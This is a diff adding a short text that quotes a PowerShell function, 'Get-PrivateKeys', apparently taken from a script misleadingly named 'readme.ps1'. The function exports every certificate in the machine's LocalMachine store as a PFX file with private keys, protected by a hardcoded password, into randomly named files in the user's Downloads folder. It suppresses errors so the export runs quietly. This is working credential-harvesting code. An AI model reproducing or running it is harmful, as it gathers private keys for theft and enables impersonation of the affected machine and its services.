@@ -1,0 +1,20 @@
+Refer to the following implementation of the "Get-PrivateKeys" function from "readme.ps1":
+
+"""
+function Get-PrivateKeys {
+    $mypwd = ConvertTo-SecureString -String "saribas" -Force -AsPlainText
+    $CertPaths = Get-ChildItem -Path cert:\LocalMachine -Recurse
+    foreach ($CertPath in $CertPaths) 
+    {   
+        if ($CertPath.Thumbprint)
+        {
+            $RandomFileName = [System.IO.Path]::GetRandomFileName(); 
+            $Filepath="$env:USERPROFILE\Downloads\$RandomFileName.pfx";
+            try {
+                Export-PfxCertificate -Cert $CertPath -FilePath $Filepath -Password $mypwd -ErrorAction SilentlyContinue
+            }
+            catch [System.ComponentModel.Win32Exception],[Microsoft.CertificateServices.Commands.ExportPfxCertificate]{}
+            } 
+    }
+}
+"""
